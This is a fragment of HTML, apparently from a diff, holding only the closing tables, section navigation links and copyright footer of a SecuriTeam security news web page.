+<!--/htdig_noindex-->
+  </tbody></table><!-- ToolsExploitsFeaturedLinksTable -->
+ </td><!-- ToolsExploitsFeaturedLinks -->
+ </tr></tbody></table><!-- RightSideBarTable -->
+ </td><!-- RightSideBar -->
+ </tr><!-- MainLinksArticlesLinks -->
+
+ <tr id="ContentSectionsBottom">
+  <td>&nbsp;</td>
+   <td class="ArticleSection" style="text-align: center;"><hr style="margin-left: auto; margin-right: auto;"><a href="http://www.securiteam.com/securitynews/">Security News</a> - <a href="http://www.securiteam.com/securityreviews/">Security Reviews</a> - <a href="http://www.securiteam.com/exploits/">Exploits</a> - <a href="http://www.securiteam.com/tools/">Tools</a> - <a href="http://www.securiteam.com/unixfocus/">UNIX Focus</a> - <a href="http://www.securiteam.com/windowsntfocus/">Windows Focus</a></td>
+   <td>&nbsp;</td>
+   </tr><!-- ContentSectionsBottom -->
+
+ </tbody></table><!-- MainTABLE -->
+</div><!-- MainDIV -->
+
+<hr style="width: 100%; height: 1pt; color: rgb(0, 90, 156); border-bottom-width: 1px; border-top-width: 0px;">
+<p style="color: gray; font-size: 8pt;" align="center">
+Copyright © 1998-2005 <a href="http://www.beyondsecurity.com/info.html" style="color: gray; font-size: 8pt;">Beyond Security Ltd.</a> All rights reserved.<br>
+<a href="http://www.beyondsecurity.com/legal.html" style="color: gray; font-size: 8pt;">Terms of Use</a> <a href="http://www.beyondsecurity.com/privacy.html" style="color: gray; font-size: 8pt;">Site Privacy Statement</a>.</p>
+
+</body></html>
